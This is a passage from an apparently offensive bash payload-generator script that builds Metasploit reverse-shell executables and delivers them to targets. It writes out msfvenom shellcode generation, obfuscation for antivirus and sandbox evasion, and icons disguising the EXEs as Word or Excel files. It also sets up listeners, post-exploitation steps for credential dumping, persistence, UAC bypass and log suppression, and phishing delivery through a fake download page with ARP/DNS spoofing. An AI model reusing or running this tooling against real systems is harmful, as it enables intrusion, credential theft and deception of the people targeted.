 echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n       fi\n\n     # CLEANING EVERYTHING UP\n     echo \"[☠] Cleanning temp generated files...\"\n     mv $IPATH/templates/exec[bak].py $InJEc2\n     rm $IPATH/output/chars.raw > /dev/null 2>&1\n     cd $IPATH/\n     sleep 2\n     clear\n\n\n   elif [ \"$ans\" \"=\" \"NXcrypt ($N4m.py) obfuscated\" ]; then\n     echo \"[☠] NXcrypt -> found ..\"\n     sleep 2\n     echo \"[☠] obfuscating -> $N4m.py!\"\n     sleep 2\n     # use NXcrypt to obfuscate sourcecode\n     cd $IPATH/obfuscate/\n     xterm -T \" NXcrypt obfuscator \" -geometry 130x26 -e \"sudo ./NXcrypt.py --file=$IPATH/output/$N4m.py --output=$IPATH/output/output_file.py\"\n     rm $IPATH/output/$N4m.py > /dev/null 2>&1\n     mv $IPATH/output/output_file.py $IPATH/output/$N4m.py\n     zenity --title=\"☠ PYTHON OUTPUT ☠\" --text \"PAYLOAD STORED UNDER:\\n$IPATH/output/$N4m.py\" --info --width 300 > /dev/null 2>&1\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n         cd $IPATH/\n       fi\n\n     # CLEANING EVERYTHING UP\n     echo \"[☠] Cleanning temp generated files...\"\n     mv $IPATH/templates/exec[bak].py $InJEc2\n     rm $IPATH/output/chars.raw > /dev/null 2>&1\n     cd $IPATH/\n     sleep 2\n     clear\n\n\n   else\n\n\n     # check if pyinstaller its installed\n     if [ -d $DrIvC/$PiWiN ]; then\n       # compile python to exe\n       echo \"[☠] pyinstaller -> found!\"\n       sleep 2\n       echo \"[☠] compile $N4m.py -> $N4m.exe\"\n       sleep 2\n       cd $IPATH/output\n\n# chose executable final icon (.ico)\niCn=$(zenity --list --title \"☠ REPLACE AGENT ICON ☠\" --text \"\\nChose icon to use:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"Windows-Store.ico\" FALSE \"Windows-Logo.ico\" FALSE \"Microsoft-Word.ico\" FALSE \"Microsoft-Excel.ico\" --width 320 --height 240) > /dev/null 2>&1\n\n       #\n       # PYINSTALLER\n       #\n       xterm -T \" PYINSTALLER \" -geometry 110x23 -e \"su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/$N4m.py'\"\n       cp $IPATH/output/dist/$N4m.exe $IPATH/output/$N4m.exe\n       rm $IPATH/output/*.spec > /dev/null 2>&1\n       rm $IPATH/output/*.log > /dev/null 2>&1\n       rm -r $IPATH/output/dist > /dev/null 2>&1\n       rm -r $IPATH/output/build > /dev/null 2>&1\n       zenity --title=\" PYINSTALLER \" --text \"PAYLOAD STORED UNDER:\\n$IPATH/output/$N4m.exe\" --info --width 300 > /dev/null 2>&1\n       echo \"\"\n       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n       echo \"[☠] Start a multi-handler...\"\n       echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n       echo \"[☯] Please dont test samples on virus total...\"\n         if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n         else\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n         fi\n\n\n       # CLEANING EVERYTHING UP\n       echo \"[☠] Cleanning temp generated files...\"\n       mv $IPATH/templates/exec[bak].py $InJEc2\n       rm $IPATH/output/chars.raw > /dev/null 2>&1\n       sleep 2\n       clear\n\n     else\n\n       # compile python to exe\n       echo \"\"\n       echo \"[☠] pyinstaller -> not found!\"\n       sleep 2\n       echo \"[☠] Please run: cd aux && sudo ./setup.sh\"\n       echo \"[☠] to install all missing dependencies ..\"\n       exit\n     fi\n   fi\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# -----------------------------------------------------\n# build shellcode in EXE format (windows-platforms)\n# encoded only using msfvenom encoders :( \n# NOTE: use or not PEScrambler on this or msf -x -k ?...\n# it flags 12/55 detections this build .\n# ------------------------------------------------------\nsh_shellcode5 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 370) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: notepad\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"notepad\";fi\n\necho \"[☠] Building shellcode -> C format ...\"\nsleep 2\necho \"[☠] obfuscating -> msf encoders!\"\nsleep 1\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\necho \"\" > $IPATH/output/chars.raw\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode (msf encoded)\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw\"\nfi\n\n\necho \"\"\n# display generated code\ncat $IPATH/output/chars.raw\necho \"\" && echo \"\"\nsleep 2\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $InJEc3 ]; then\n      echo \"[☠] exec_bin.c -> found!\"\n      sleep 2\n   else\n      echo \"[☠] exec_bin.c -> not found!\"\n      exit\n   fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n   # check if mingw32 exists\n   audit=`which $ComP`> /dev/null 2>&1\n   if [ \"$?\" -eq \"0\" ]; then\n      echo \"[☠] mingw32 compiler -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] mingw32 compiler -> not found!\"\n      echo \"[☠] Download compiler -> apt-get install mingw32\"\n      echo \"\"\n      sudo apt-get install mingw32\n      echo \"\"\n      fi\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc3 $IPATH/templates/exec_bin[bak].c\ncp $IPATH/templates/exec_bin2.c $IPATH/templates/exec_bin2[bak].c\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\n\n\n\n   # C OBFUSCATION MODULE \n   OBF=$(zenity --list --title \"☠ AGENT STRING OBFUSCATION ☠\" --text \"Obfuscate the agent [ template ] command arguments ?\\nUsing special escape characters, whitespaces, concaternation, amsi\\nsandbox evasion and variables piped and de-obfuscated at runtime\\n'The agent will delay 3 sec is execution to evade sandbox detection'\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"None-Obfuscation (default)\" FALSE \"String Obfuscation (3 sec)\" --width 353 --height 245) > /dev/null 2>&1\nif [ \"$OBF\" = \"None-Obfuscation (default)\" ]; then\n  cd $IPATH/templates\n  # edit exec.c using leafpad or gedit editor\n  if [ \"$DiStR0\" = \"Kali\" ]; then\n     leafpad $InJEc3 > /dev/null 2>&1\n  else\n     gedit $InJEc3 > /dev/null 2>&1\n  fi\n\n\nelse\necho \"[✔] String obfuscation technics sellected ..\"\ncd $IPATH/templates\n\n  # edit exec.c using leafpad or gedit editor\n  if [ \"$DiStR0\" = \"Kali\" ]; then\n     leafpad exec_bin2.c > /dev/null 2>&1\n  else\n     gedit exec_bin2.c > /dev/null 2>&1\n  fi\n  mv exec_bin2.c exec_bin.c > /dev/null 2>&1\nfi\n\n\n\ncd $IPATH/templates\n# COMPILING SHELLCODE USING mingw32\necho \"[☠] Compiling using mingw32...\"\nsleep 2\n# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D\n$ComP exec_bin.c -o $N4m.exe -lws2_32 -mwindows\nmv $N4m.exe $IPATH/output/$N4m.exe\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.exe\\n\\nchose how to deliver: $N4m.exe\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 230) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n         if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n\n           cd $IPATH/output\n           # delete utf-8/non-ancii caracters from output\n           tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n           sed -i \"s/\\[0m//g\" final.log\n           sed -i \"s/\\[1m\\[34m//g\" final.log\n           sed -i \"s/\\[4m//g\" final.log\n           sed -i \"s/\\[K//g\" final.log\n           sed -i \"s/\\[1m\\[31m//g\" final.log\n           sed -i \"s/\\[1m\\[32m//g\" final.log\n           sed -i \"s/\\[1m\\[33m//g\" final.log\n           mv final.log $N4m-$lhost.log > /dev/null 2>&1\n           rm report.log > /dev/null 2>&1\n           cd $IPATH/\n         else\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n           else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n           fi\n         fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 350) > /dev/null 2>&1\n\n  if [ \"$P0\" = \"persistence.rc\" ]; then\n  M1P=$(zenity --entry --title \"☠ AUTO-START PAYLOAD ☠\" --text \"\\nAuto-start payload Every specified hours 1-23\\n\\nexample: 23\\nwill auto-start $N4m.exe on target every 23 hours\" --width 300) > /dev/null 2>&1\n\n    cd $IPATH/aux\n    # Build persistence script (AutoRunStart='multi_console_command -r')\n    cp persistence.rc persistence[bak].rc\n    sed -i \"s|N4m|$N4m.exe|g\" persistence.rc\n    sed -i \"s|IPATH|$IPATH|g\" persistence.rc\n    sed -i \"s|M1P|$M1P|g\" persistence.rc\n\n    # Build listenner resource file\n    echo \"use exploit/multi/handler\" > $lhost.rc\n    echo \"set LHOST $lhost\" >> $lhost.rc\n    echo \"set LPORT $lport\" >> $lhost.rc\n    echo \"set PAYLOAD $paylo\" >> $lhost.rc\n    echo \"exploit\" >> $lhost.rc\n    mv $lhost.rc $IPATH/output/$lhost.rc\n    cd $IPATH\n\n    elif [ \"$P0\" = \"privilege_escalation.rc\" ]; then\n      cd $IPATH/aux\n      # backup files needed\n      cp privilege_escalation.rc privilege_escalation[bak].rc\n      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb\n      # Build resource files needed\n      sed -i \"s|N4m|$N4m.exe|g\" privilege_escalation.rc\n      sed -i \"s|IPATH|$IPATH|g\" privilege_escalation.rc\n      sed -i \"s|N4m|$N4m.exe|g\" enigma_fileless_uac_bypass.rb\n      # reload metasploit database\n      echo \"[☠] copy post-module to msf db!\"\n      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb\n      echo \"[☠] reloading -> Metasploit database!\"\n      xterm -T \" reloading -> Metasploit database \" -geometry 110x23 -e \"sudo msfconsole -x 'reload_all; exit -y'\" > /dev/null 2>&1\n      cd $IPATH\n\n\n  elif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n\n\n  else\n\n    echo \"do nothing\" > /dev/null 2>&1\n\nfi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.exe|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.exe|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n           else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n           if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n           else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              